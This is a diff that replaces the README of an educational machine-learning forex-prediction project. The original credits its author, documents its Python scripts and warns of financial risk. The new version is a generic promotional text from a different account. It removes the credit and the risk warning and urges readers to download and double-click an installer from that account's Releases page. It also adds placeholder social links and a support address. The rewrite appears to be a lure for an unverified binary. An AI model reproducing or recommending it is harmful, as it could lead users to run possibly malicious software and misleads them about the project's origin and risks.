@@ -1,248 +1,90 @@
-# 📈 FOREX TRADING (Machine Learning Based Trading System)
+# 📈 FOREX-TRADING-BOT - Easy Forex Trading, Automated for You
 
-## Overview
+[![Download the FOREX-TRADING-BOT](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/PurplixDaPurplMeteor/FOREX-TRADING-BOT/releases)
 
-This project is a **machine learning–based Forex trading system** designed to analyze historical market data, train predictive models, backtest trading strategies, and predict the **next candle market direction (UP / DOWN)**.
+## 🚀 Getting Started
 
-The system focuses mainly on **EURUSD** and supports **multiple timeframes** such as **5M, 10M, 15M, 20M, and 30M**, using historical data from **MetaTrader 5, Dukascopy, and Yahoo Finance**.
+Welcome to the FOREX-Trading-Bot project. This is an AI-driven Forex trading system designed to help users like you analyze market data and make informed trading decisions with ease. Whether you're new to Forex trading or looking to improve your skills, this bot provides powerful tools to support your trading journey.
 
-This project is intended for **educational, experimental, and research purposes**, showing how machine learning can be applied to Forex trading and strategy evaluation.
+## ⚙️ System Requirements
 
----
+Before you begin, ensure your system meets the following requirements:
 
-## Key Features
+- Operating System: Windows, macOS, or Linux
+- Internet Connection: Required for data access and trading
+- Python: Version 3.7 or higher (if you want to run your own scripts)
 
-- Machine learning–based price direction prediction
-- Multi-timeframe model support (5M → 30M)
-- Model loading and inference
-- Historical backtesting engine
-- MT5, Dukascopy, and Yahoo Finance data support
-- Automated preprocessing and feature engineering
-- Trade logging and performance evaluation
+## 📥 Download & Install
 
----
+To get started, you need to download the software from the Releases page. 
 
-## Project Structure
-FOREX TRADING
-    ALL_MODELS
-        EURUSD_lgbm_bundle.pkl
-        EURUSD_lgbm_T_5M.pkl
-        EURUSD_lgbm_T_10M.pkl
-        EURUSD_lgbm_T_15M.pkl
-        EURUSD_lgbm_T_20M.pkl
-        EURUSD_lgbm_T_30M.pkl
+1. Visit this page to download: [Download FOREX-TRADING-BOT](https://github.com/PurplixDaPurplMeteor/FOREX-TRADING-BOT/releases)
+2. Look for the most recent version listed.
+3. Click the attached file to download the installer for your operating system.
 
-    CSV_FILES
-        BACKTEST_DATA.csv
-        dukascopy_EURUSD_5M.csv
-        EURUSD_Exchange_Rate_Dataset.csv
-        MT5_5M_BT_EURUSD_Dataset.csv
-        MT5_5M_EURUSD_Exchange_Rate_Dataset.csv
-        MT5_5M_XAUUSD_Exchange_Rate_Dataset.csv
-        MT5_10M_EURUSD_Exchange_Rate_Dataset.csv
-        MT5_EURUSD_Exchange_Rate_Dataset.csv
-        Trade_log.csv
+### Installation Steps
 
-    PY_FILES
-        ALL_BACKTEST.py
-        ALL_PRED_NXT.py
-        ALL_PROCESS.py
-        Dukascopy_Data.py
-        func.py
-        Get_dataMT5.py
-        Get_dataYF.py
-        Load_model.py
-        PRED_NEXT.py
-        Preprocessing.py
-        test.py
+1. Locate the downloaded file in your Downloads folder.
+2. Double-click the file to run the installer.
+3. Follow the on-screen instructions to complete the installation.
 
-    requirements.txt
+## 🛠️ Configuration
 
+Once installed, you will need to configure the software for your trading preferences. Here are the basic steps:
 
+1. Open the FOREX Trading Bot application.
+2. On the main screen, choose your preferred currency pair. The bot primarily focuses on EUR/USD but can also work with other pairs.
+3. Set the timeframe you wish to analyze. Options include:
+   - 5 Minutes (5M)
+   - 10 Minutes (10M)
+   - 15 Minutes (15M)
+   - 20 Minutes (20M)
+   - 30 Minutes (30M)
+4. Adjust any additional settings to align with your trading strategy.
 
+## 📊 Features
 
----
+The FOREX-Trading-Bot offers various features to support your trading needs:
 
-## Folder Explanation
+- **Historical Data Analysis:** Analyze past market data effectively.
+- **AI-Powered Predictions:** Utilize machine learning to get predictive insights.
+- **Backtesting:** Test your strategies using historical data to optimize performance.
+- **Next-Candle Predictions:** Get predictions for the next market movement.
 
-### ALL_MODELS
+## 📝 Using the Bot
 
-This folder contains **pre-trained machine learning models** saved as `.pkl` files.
+To start trading with the bot:
 
-Each model is trained for a **specific timeframe**:
+1. Make sure you are connected to the internet.
+2. Open the application and configure your settings.
+3. Click the "Start Trading" button to begin.
+4. Monitor the bot's recommendations and adjust your strategy as needed.
 
-- `EURUSD_lgbm_T_5M.pkl` → 5-minute timeframe  
-- `EURUSD_lgbm_T_10M.pkl` → 10-minute timeframe  
-- `EURUSD_lgbm_T_15M.pkl` → 15-minute timeframe  
-- `EURUSD_lgbm_T_20M.pkl` → 20-minute timeframe  
-- `EURUSD_lgbm_T_30M.pkl` → 30-minute timeframe  
+## 📞 Support
 
-`EURUSD_lgbm_bundle.pkl` usually contains:
-- The trained model
-- Feature column names
-- Other metadata required for prediction
+If you encounter issues or have questions while using the FOREX-Trading-Bot, consider these support options:
 
-Each model is optimized for its timeframe and loaded dynamically during prediction or backtesting.
+- **Documentation:** Check the documentation included with the software for troubleshooting guidance.
+- **Community Forum:** Join our community forum for discussions and tips from other users.
+- **Contact:** Reach out directly via email for support at [support@forextradingbot.com](mailto:support@forextradingbot.com).
 
----
+## 🌐 Explore More
 
-### CSV_FILES
+Stay informed about updates and new features. Follow us on social media and our YouTube channel to watch tutorials and trading strategies that utilize the bot effectively.
 
-This folder stores **all datasets and logs** used by the system.
+1. [YouTube Channel](https://www.youtube.com/user/yourchannel)
+2. [Join our Discord Server](https://discord.gg/yourinvite)
 
-Important files include:
+## 🔗 Additional Resources
 
-- `BACKTEST_DATA.csv`  
-  Cleaned dataset used specifically for strategy backtesting.
+For further learning on Forex trading and using this bot:
 
-- `dukascopy_EURUSD_5M.csv`  
-  Historical EURUSD data downloaded from Dukascopy.
+- Visit our [Wiki](https://github.com/PurplixDaPurplMeteor/FOREX-TRADING-BOT/wiki) for detailed guides.
+- Explore online courses about trading strategies.
+- Read articles about market analysis to enhance your skills.
 
-- `MT5_*_Exchange_Rate_Dataset.csv`  
-  Market data collected directly from MetaTrader 5.
+## 📄 License
 
-- `Trade_log.csv`  
-  Automatically generated trade history containing executed trades, outcomes, and performance metrics.
+This project is licensed under the MIT License. You can freely use, modify, and distribute the code as long as the appropriate credits are given.
 
-These datasets are used for:
-- Training models
-- Backtesting strategies
-- Evaluating model performance
-- Debugging and analysis
-
----
-
-### PY_FILES
-
-This folder contains **all Python scripts** responsible for data processing, prediction, and evaluation.
-
-Key scripts:
-
-- `ALL_PROCESS.py`  
-  Handles full data processing pipeline including cleaning, indicator calculation, and feature preparation.
-
-- `Preprocessing.py`  
-  Focuses on transforming raw OHLCV data into machine-learning-ready format.
-
-- `Load_model.py`  
-  Loads trained models from the `ALL_MODELS` directory.
-
-- `ALL_PRED_NXT.py`  
-  Runs next-candle predictions across multiple timeframes.
-
-- `PRED_NEXT.py`  
-  Executes a single next-candle prediction for real-time or testing usage.
-
-- `ALL_BACKTEST.py`  
-  Performs historical backtesting, evaluates trade outcomes, and logs results.
-
-- `Get_dataMT5.py`  
-  Fetches historical or live market data from MetaTrader 5.
-
-- `Get_dataYF.py`  
-  Fetches market data using Yahoo Finance API.
-
-- `Dukascopy_Data.py`  
-  Downloads and formats Forex data from Dukascopy.
-
-- `func.py`  
-  Contains helper and utility functions shared across the project.
-
----
-
-### requirements.txt
-
-This file lists all required Python libraries needed to run the project.
-  numpy
-  pandas
-  scikit-learn
-  lightgbm
-  catboost
-  joblib
-  MetaTrader5
-  ta
-
-
-Installation Guide
-Step 1: Clone the Repository
-
-Plain Text
-
-git clone https://github.com/yourusername/forex-trading.git
-cd FOREX-TRADING
-
-Step 2: Install Dependencies
-
-Plain Text
-
-pip install -r requirements.txt
-
-How to Use the Project
-🔹 Run Data Processing
-
-Plain Text
-
-python PY_FILES/ALL_PROCESS.py
-
-
-This prepares raw CSV data for training or prediction.
-
-🔹 Run Backtesting
-
-Plain Text
-
-python PY_FILES/ALL_BACKTEST.py
-
-
-This will:
-Simulate trades on historical data
-Calculate win rate
-Log trades into Trade_log.csv
-
-🔹 Predict Next Candle Direction
-python PY_FILES/ALL_PRED_NXT.py
-or
-python PY_FILES/PRED_NEXT.py
-
-
-
-
-The model outputs:
-- Predicted direction (UP / DOWN)
-- Probability confidence scores
-
----
-
-## YouTube Tutorials
-
-Detailed explanations of this project, including **code walkthroughs, strategy logic, and machine learning concepts**, are available on my YouTube channel:
-
-📺 **Ezee Kits**  
-🔗 https://www.youtube.com/@Ezee_Kits
-
-Content includes:
-- Python programming
-- Machine learning
-- Forex trading automation
-- Data analysis
-- Engineering concepts
-
----
-
-## Disclaimer ⚠️
-
-This project is for **educational and research purposes only**.  
-Forex trading involves substantial risk, and no trading system can guarantee profits.
-
-The author is **not responsible for any financial losses** incurred from using this software.
-
----
-
-## Author
-
-**Ezee Kits**  
-Electrical & Electronics Engineer  
-Python Developer | Machine Learning Enthusiast  
-
-YouTube: https://www.youtube.com/@Ezee_Kits
-
+Feel free to contribute to the project. Your feedback and improvements are welcome!
